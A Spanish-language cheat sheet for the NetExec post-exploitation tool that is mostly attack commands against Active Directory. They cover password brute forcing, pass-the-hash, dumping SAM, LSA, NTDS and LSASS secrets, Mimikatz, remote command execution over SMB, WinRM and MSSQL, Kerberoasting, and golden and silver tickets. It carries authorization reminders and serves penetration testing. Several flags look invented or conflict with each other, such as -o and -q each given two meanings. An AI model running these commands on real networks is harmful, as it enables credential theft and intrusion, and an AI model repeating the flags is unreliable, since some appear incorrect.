# NetExec Cheat Sheet

## Overview

NetExec (anteriormente CrackMapExec o CME) es una herramienta de post-explotación utilizada para:

- Automatizar la evaluación de grandes redes de Active Directory.
- Enumerar usuarios, shares y sesiones.
- Ejecutar comandos remotamente.
- Volcar credenciales (NTLM, hashes).
- Llevar a cabo evaluaciones de seguridad autorizadas.

NetExec proporciona:

- Protocolos SMB, WinRM, MSSQL, LDAP y RDP.
- Arquitectura modular para extensiones.
- Ejecución paralela para velocidad.
- Reutilización de credenciales y ataques pass-the-hash.
- Integración con otras herramientas de pentesting.

```text
Usa NetExec únicamente contra sistemas que poseas o tengas autorización explícita para testear.
```

---

# 1. Starting NetExec

## Sintaxis básica

```bash
nxc <protocol> <target> [options]
```

## Mostrar ayuda

```bash
nxc -h
```

## Mostrar versión

```bash
nxc --version
```

## Actualizar NetExec

```bash
pipx upgrade netexec
```

O desde el código fuente:

```bash
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
pipx install .
```

## Protocolos disponibles

```bash
nxc smb -h
nxc winrm -h
nxc mssql -h
nxc ldap -h
nxc rdp -h
nxc vnc -h
```

---

# 2. Target Specification

## Objetivo único

```bash
nxc smb <target-ip>
```

Ejemplo:

```bash
nxc smb 192.168.1.10
```

## Múltiples objetivos

```bash
nxc smb <target1> <target2> <target3>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 192.168.1.11 192.168.1.12
```

## Objetivo desde archivo

```bash
nxc smb <file>
```

Ejemplo:

```bash
nxc smb targets.txt
```

## Subred objetivo

```bash
nxc smb <subnet>
```

Ejemplo:

```bash
nxc smb 192.168.1.0/24
```

## Objetivo con puerto

```bash
nxc smb <target> --port <port>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 --port 445
```

---

# 3. Authentication

## Sin autenticación (null session)

```bash
nxc smb <target>
```

## Username y password

```bash
nxc smb <target> -u <username> -p <password>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Lista de usuarios y password

```bash
nxc smb <target> -u <userfile> -p <password>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u users.txt -p password123
```

## Username y lista de passwords

```bash
nxc smb <target> -u <userfile> -p <passfile>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
```

## Hash NTLM

```bash
nxc smb <target> -u <username> -H <hash>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## Clave AES

```bash
nxc smb <target> -u <username> -a <aes-key>
```

## Autenticación Kerberos

```bash
nxc smb <target> -u <username> -k
```

## Usar credenciales en caché

```bash
nxc smb <target> --use-kcache
```

---

# 4. Enumeration

## Enumerar usuarios

```bash
nxc smb <target> -u <username> -p <password> --users
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -p password123 --users
```

## Enumerar grupos

```bash
nxc smb <target> -u <username> -p <password> --groups
```

## Enumerar shares

```bash
nxc smb <target> -u <username> -p <password> --shares
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Enumerar sesiones

```bash
nxc smb <target> -u <username> -p <password> --sessions
```

## Enumerar discos

```bash
nxc smb <target> -u <username> -p <password> --disks
```

## Enumerar usuarios admin locales

```bash
nxc smb <target> -u <username> -p <password> --local-admins
```

## Enumerar usuarios conectados

```bash
nxc smb <target> -u <username> -p <password> --loggedon-users
```

## Enumerar RID cycling

```bash
nxc smb <target> -u <username> -p <password> --rid-brute
```

## Obtener información del dominio

```bash
nxc smb <target> -u <username> -p <password> --domain-info
```

## Obtener información del SO

```bash
nxc smb <target> -u <username> -p <password> --os-info
```

---

# 5. Command Execution

## Ejecutar comando

```bash
nxc smb <target> -u <username> -p <password> -x <command>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Ejecutar comando con output

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method smbexec
```

## Ejecutar comando PowerShell

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method powershell
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "Get-Process" --exec-method powershell
```

## Ejecutar comando vía WMI

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method wmi
```

## Ejecutar comando vía MMC

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method mmcexec
```

## Ejecutar comando vía atexec

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method atexec
```

## Ejecutar script PowerShell

```bash
nxc smb <target> -u <username> -p <password> -x <script> --exec-method powershell
```

## Ejecutar archivo

```bash
nxc smb <target> -u <username> -p <password> --exec-file <file>
```

---

# 6. Credential Dumping

## Volcar SAM

```bash
nxc smb <target> -u <username> -p <password> --sam
```

## Volcar LSA

```bash
nxc smb <target> -u <username> -p <password> --lsa
```

## Volcar NTDS

```bash
nxc smb <target> -u <username> -p <password> --ntds
```

## Volcar DPAPI

```bash
nxc smb <target> -u <username> -p <password> --dpapi
```

## Volcar credenciales

```bash
nxc smb <target> -u <username> -p <password> --dump
```

## Volcar LSASS

```bash
nxc smb <target> -u <username> -p <password> --lsass
```

## Mimikatz

```bash
nxc smb <target> -u <username> -p <password> --mimikatz
```

## Nanodump

```bash
nxc smb <target> -u <username> -p <password> --nanodump
```

## Extraer certificados

```bash
nxc smb <target> -u <username> -p <password> --certificates
```

---

# 7. Pass-the-Hash

## Ataque pass-the-hash

```bash
nxc smb <target> -u <username> -H <hash>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## Pass-the-hash con comando

```bash
nxc smb <target> -u <username> -H <hash> -x <command>
```

## Overpass-the-hash

```bash
nxc smb <target> -u <username> -H <hash> --delegate <target>
```

## Silver ticket

```bash
nxc smb <target> -u <username> -H <hash> --silver-ticket <ticket>
```

## Golden ticket

```bash
nxc smb <target> -u <username> -H <hash> --golden-ticket <ticket>
```

---

# 8. Module Usage

## Listar módulos disponibles

```bash
nxc smb <target> -m
```

## Usar módulo específico

```bash
nxc smb <target> -u <username> -p <password> -m <module>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Módulo con opciones

```bash
nxc smb <target> -u <username> -p <password> -m <module> -o <option>=<value>
```

Ejemplo:

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz -o COMMAND=ls
```

## Módulos comunes

```bash
# Mimikatz
nxc smb <target> -u <username> -p <password> -m mimikatz

# Nanodump
nxc smb <target> -u <username> -p <password> -m nanodump

# Empire
nxc smb <target> -u <username> -p <password> -m empire_exec

# Metasploit
nxc smb <target> -u <username> -p <password> -m met_inject

# RDP
nxc smb <target> -u <username> -p <password> -m rdp

# VNC
nxc smb <target> -u <username> -p <password> -m vnc

# GPP
nxc smb <target> -u <username> -p <password> -m gpp_autologin

# Bloodhound
nxc smb <target> -u <username> -p <password> -m bloodhound
```

---

# 9. WinRM Protocol

## Escaneo WinRM básico

```bash
nxc winrm <target> -u <username> -p <password>
```

Ejemplo:

```bash
nxc winrm 192.168.1.10 -u admin -p password123
```

## Ejecutar comando vía WinRM

```bash
nxc winrm <target> -u <username> -p <password> -x <command>
```

## Subir archivo vía WinRM

```bash
nxc winrm <target> -u <username> -p <password> --put-file <local> <remote>
```

## Descargar archivo vía WinRM

```bash
nxc winrm <target> -u <username> -p <password> --get-file <remote> <local>
```

## WinRM con hash

```bash
nxc winrm <target> -u <username> -H <hash>
```

---

# 10. MSSQL Protocol

## Escaneo MSSQL básico

```bash
nxc mssql <target> -u <username> -p <password>
```

## Ejecutar query

```bash
nxc mssql <target> -u <username> -p <password> -q <query>
```

Ejemplo:

```bash
nxc mssql 192.168.1.10 -u sa -p password123 -q "SELECT @@version"
```

## Habilitar xp_cmdshell

```bash
nxc mssql <target> -u <username> -p <password> --enable-xp-cmdshell
```

## Ejecutar comando vía xp_cmdshell

```bash
nxc mssql <target> -u <username> -p <password> -x <command>
```

## Volcar hashes

```bash
nxc mssql <target> -u <username> -p <password> --dump-hashes
```

---

# 11. LDAP Protocol

## Escaneo LDAP básico

```bash
nxc ldap <target> -u <username> -p <password>
```

## Enumerar usuarios

```bash
nxc ldap <target> -u <username> -p <password> --users
```

## Enumerar grupos

```bash
nxc ldap <target> -u <username> -p <password> --groups
```

## Enumerar computadoras

```bash
nxc ldap <target> -u <username> -p <password> --computers
```

## Enumerar DCs

```bash
nxc ldap <target> -u <username> -p <password> --dc-list
```

## AS-REP roasting

```bash
nxc ldap <target> -u <username> -p <password> --asreproast
```

## Kerberoasting

```bash
nxc ldap <target> -u <username> -p <password> --kerberoasting
```

## Colección Bloodhound

```bash
nxc ldap <target> -u <username> -p <password> --bloodhound
```

## LDAP con hash

```bash
nxc ldap <target> -u <username> -H <hash>
```

---

# 12. Output Options

## Guardar output en archivo

```bash
nxc smb <target> -u <username> -p <password> -o <output-file>
```

## Output verbose

```bash
nxc smb <target> -u <username> -p <password> -v
```

## Output debug

```bash
nxc smb <target> -u <username> -p <password> -d
```

## Modo quiet

```bash
nxc smb <target> -u <username> -p <password> -q
```

## Mostrar solo resultados exitosos

```bash
nxc smb <target> -u <username> -p <password> --show-success
```

## Mostrar solo resultados fallidos

```bash
nxc smb <target> -u <username> -p <password> --show-fail
```

## Exportar credenciales

```bash
nxc smb <target> -u <username> -p <password> --export-creds <file>
```

---

# 13. Common Attack Scenarios

## Enumeración básica

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Enumerar shares

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Ejecutar comando

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Pass-the-hash

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## Volcar credenciales

```bash
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Mimikatz

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Brute-force

```bash
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
```

## Kerberoasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting
```

## AS-REP roasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --asreproast
```

## Bloodhound

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound
```

---

# 14. Practical Workflows

## Flujo de trabajo básico de enumeración AD

```text
1. Identificar domain controllers.
2. Enumerar usuarios y grupos.
3. Comprobar políticas de contraseñas.
4. Enumerar shares y sesiones.
5. Buscar reutilización de credenciales.
6. Documentar hallazgos.
```

## Ejemplo: Enumeración completa

```bash
# Escaneo básico
nxc smb 192.168.1.10 -u admin -p password123

# Enumerar usuarios
nxc smb 192.168.1.10 -u admin -p password123 --users

# Enumerar shares
nxc smb 192.168.1.10 -u admin -p password123 --shares

# Ejecutar comando
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"

# Volcar credenciales
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Ejemplo: Pass-the-hash

```bash
# Ataque PTH
nxc smb 192.168.1.10 -u admin -H hash

# Ejecutar comando con PTH
nxc smb 192.168.1.10 -u admin -H hash -x "whoami"
```

## Ejemplo: Kerberoasting

```bash
# Kerberoast
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting

# Guardar en archivo
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting > kerberoast.txt
```

## Ejemplo: Bloodhound

```bash
# Recoger datos de Bloodhound
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound

# Con colector específico
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound --collection all
```

---

# 15. Common Commands Reference

| Command | Description |
|---|---|
| `nxc smb <target>` | Escaneo SMB |
| `nxc winrm <target>` | Escaneo WinRM |
| `nxc mssql <target>` | Escaneo MSSQL |
| `nxc ldap <target>` | Escaneo LDAP |
| `nxc -u <user> -p <pass>` | Autenticar |
| `nxc -u <user> -H <hash>` | Pass-the-hash |
| `nxc --users` | Enumerar usuarios |
| `nxc --groups` | Enumerar grupos |
| `nxc --shares` | Enumerar shares |
| `nxc --sessions` | Enumerar sesiones |
| `nxc -x <command>` | Ejecutar comando |
| `nxc --dump` | Volcar credenciales |
| `nxc --sam` | Volcar SAM |
| `nxc --lsa` | Volcar LSA |
| `nxc --ntds` | Volcar NTDS |
| `nxc -m <module>` | Usar módulo |
| `nxc --mimikatz` | Ejecutar Mimikatz |
| `nxc --kerberoasting` | Kerberoast |
| `nxc --asreproast` | AS-REP roast |
| `nxc --bloodhound` | Colección Bloodhound |

---

# 16. Troubleshooting

## Connection refused

- Comprueba si el objetivo es alcanzable.
- Verifica que el puerto está abierto (445, 5985, 1433, 389).
- Comprueba las reglas del firewall.
- Asegúrate de que el servicio está en ejecución.

## Access denied

- Verifica que las credenciales son correctas.
- Comprueba los permisos del usuario.
- Prueba un método de autenticación diferente.
- Usa pass-the-hash si está disponible.

## Ejecución de comando fallida

- Prueba un exec-method diferente.
- Comprueba si el comando está permitido.
- Verifica que el usuario tiene derechos de ejecución.
- Usa un protocolo alternativo.

## Módulo no encontrado

- Actualiza NetExec.
- Comprueba que el nombre del módulo es correcto.
- Verifica que el módulo está instalado.
- Lista los módulos disponibles con `-m`.

## Rendimiento lento

- Reduce los threads concurrentes.
- Comprueba la latencia de red.
- Usa protocolos específicos.
- Limita el alcance del objetivo.

---

# 17. Security Best Practices

## Verifica siempre los hallazgos

- Testea las credenciales manualmente.
- Verifica la ejecución de comandos.
- Cruza información con otras herramientas.
- Documenta todos los hallazgos.

## Respeta los límites legales

- Solo testea sistemas que poseas.
- Obtén autorización explícita.
- Sigue la divulgación responsable.
- Documenta todas las actividades.

## Minimiza el impacto

- Usa enumeración apropiada.
- Evita escaneos agresivos.
- Testea durante ventanas de mantenimiento.
- Monitoriza los sistemas objetivo.

## Mantén las herramientas actualizadas

- Actualiza NetExec regularmente.
- Mantente informado sobre nuevos módulos.
- Sigue los advisories de seguridad.
- Testea en entornos controlados.

## Documenta todo

- Registra todos los comandos usados.
- Nota las credenciales encontradas.
- Rastrea los resultados de enumeración.
- Documenta hallazgos y métodos.

---

# 18. Important Reminders

- Obtén siempre autorización explícita antes de usar NetExec.
- Testea primero en un entorno de laboratorio controlado.
- Algunos módulos pueden triggerar alertas de seguridad.
- Respeta los límites y políticas de red.
- Mantén NetExec actualizado regularmente.
- Valida los hallazgos manualmente.
- Documenta todas las acciones y comandos.
- Preserva la evidencia original y los logs.
- Entiende las implicaciones legales y éticas.
- Limpia después de testear.

---

# 19. Quick Reference Examples

## Escaneo SMB básico

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Enumerar shares

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Ejecutar comando

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Pass-the-hash

```bash
nxc smb 192.168.1.10 -u admin -H hash
```

## Volcar credenciales

```bash
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Mimikatz

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Kerberoasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting
```

## AS-REP roasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --asreproast
```

## Bloodhound

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound
```

## Ejecución WinRM

```bash
nxc winrm 192.168.1.10 -u admin -p password123 -x "whoami"
```

---

# 20. Additional Resources

## NetExec Official

```text
https://github.com/Pennyw0rth/NetExec
```

## NetExec Documentation

```text
https://www.netexec.wiki/
```

## CrackMapExec Legacy

```text
https://github.com/byt3bl33d3r/CrackMapExec
```

## Active Directory Security

```text
https://www.ired.team/
```

## Bloodhound

```text
https://github.com/BloodHoundAD/BloodHound
```
